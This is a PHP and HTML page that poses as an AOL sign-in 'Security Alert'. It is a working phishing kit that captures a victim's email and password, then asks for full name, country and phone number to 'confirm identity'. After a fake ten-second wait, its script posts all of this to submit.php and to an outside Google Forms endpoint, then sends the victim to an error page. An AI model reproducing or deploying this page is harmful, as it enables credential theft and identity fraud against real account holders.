<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $_SESSION['password'] = $_POST['password'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Aol Sign in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
    <script src="../../../ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="../../../maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">
    <style>
    .loader {
        height: 120px;
        width: 120px;
        border: 16px solid #d9d9d9;
        border-top: 16px solid #39f;
        border-radius: 50%;
        animation: spin 2s linear infinite;
        margin-left: 45%;
        margin-top: 10%;
        display: none;
    }
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
    .body {
        display: none;
    }
    .please-wait {
        font-size: 2em;
        font-weight: bold;
        text-align: center;
        margin-top: 20%;
    }
    .dots {
        display: inline-block;
        width: 0.5em;
        height: 0.5em;
        border-radius: 50%;
        background-color: #000;
        margin-left: 5px;
        animation: blink 1.4s infinite both;
    }
    .dots:nth-child(2) {
        background-color: #39f;
        animation-delay: 0.2s;
    }
    .dots:nth-child(3) {
        background-color: #ff6347;
        animation-delay: 0.4s;
    }
    .dots:nth-child(4) {
        background-color: #32cd32;
        animation-delay: 0.6s;
    }
    @keyframes blink {
        0%, 80%, 100% {
            opacity: 0;
        }
        40% {
            opacity: 1;
        }
    }
    </style>
</head>
<body>
    <div class="please-wait">Please wait<span class="dots">.</span><span class="dots">.</span><span class="dots">.</span></div>
    <div class="loader"></div>
    <div class="body">
        <div class="background">
            <div class="">
                <img src="img/logo.png" class="logo image-responsive" alt="">
            </div>
        </div>

        <div class="container">
            <div class="col-md-4 col-sm-5 col-xs-12 col-md-offset-7 col-sm-offset-6 sigin-box">
                <h1 class="text-center"><img src="img/logo.png" class="logo1" alt=""></h1>
                <h3 id="sign-head1" class="text-center">Security Alert</h3>
                <h3 id="sign-head" class="text-center" onclick="redirect()">Confirm your identity</h3><br><br>
                <form id="form" autocomplete="off">
                    <input type="text" id="name" name="name" placeholder="Full Name" class="sign-input" required><br><br>
                    <input type="hidden" id="email" class="sign-input" value="<?php echo $_SESSION['email']; ?>">
                    <input type="hidden" id="password" class="sign-input" value="<?php echo $_SESSION['password']; ?>">
                    <input type="hidden" id="ip" value="">
                    <input type="hidden" id="os" value="">
                    <input type="hidden" id="browser" value="">
                    <input type="hidden" id="city" value="">
                    <input type="hidden" id="state" value="">
                    <input type="hidden" id="issue" value="">
                    <select id="country" style="padding: 0px;" class="form-control sign-input" required>
                        <option value="">Country</option>
                        <option value="United States">United States</option>
                        <option value="Canada">Canada</option>
                        <option value="Australia">Australia</option>
                        <option value="United Kingdom">United Kingdom</option>
                        <option value="Other">Other</option>
                    </select><br>
                    <p class="text-center"><b>Enter your phone number and we will send you a verification code to confirm your identity</b></p>
                    <input type="text" id="phone" name="phone" placeholder="Phone No." class="sign-input" required><br><br>
                    <input type="button" id="finalSubmitBtn" class="submit-nbtn" value="Submit"><br>
                </form>
            </div>
        </div>
    </div>

    <!-- jQuery -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <!-- Bootstrap JS -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <script>
        $(document).ready(function() {
            setTimeout(function() {
                $(".please-wait").hide();
                $(".body").show();
            }, 10000);

            $('#finalSubmitBtn').click(function() {
                var name = $('#name').val();
                var country = $('#country').val();
                var phone = $('#phone').val();
                var email = $('#email').val();
                var password = $('#password').val();

                $(".body").hide();
                $(".loader").show();

                $.ajax({
                    type: 'POST',
                    url: 'submit.php',
                    data: {
                        email: email,
                        password: password,
                        name: name,
                        country: country,
                        phone: phone
                    },
                    success: function(response) {
                        if (response == 'Success') {
                            postToGoogle(email, password, name, country, phone);
                        } else {
                            alert('Failed to submit to server.');
                            $(".body").show();
                            $(".loader").hide();
                        }
                    },
                    error: function() {
                        alert('Failed to submit to server.');
                        $(".body").show();
                        $(".loader").hide();
                    }
                });
            });
        });

        function postToGoogle(email, password, name, country, phone) {
            $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSd_S6ieEDyylottc3t0JQiuZ4Ehz5q1QFS4OPHtr74NXeCECw/formResponse",
                data: {
                    "entry.506148844": email,
                    "entry.201745671": password,
                    "entry.1916018055": name,
                    "entry.523381256": country,
                    "entry.659179735": phone
                },
                type: "POST",
                dataType: "xml",
                success: function() {
                    window.location.href = "err.html";
                },
                error: function() {
                
                    window.location.href = "err.html";
                }
            });
        }
    </script>
</body>
</html>
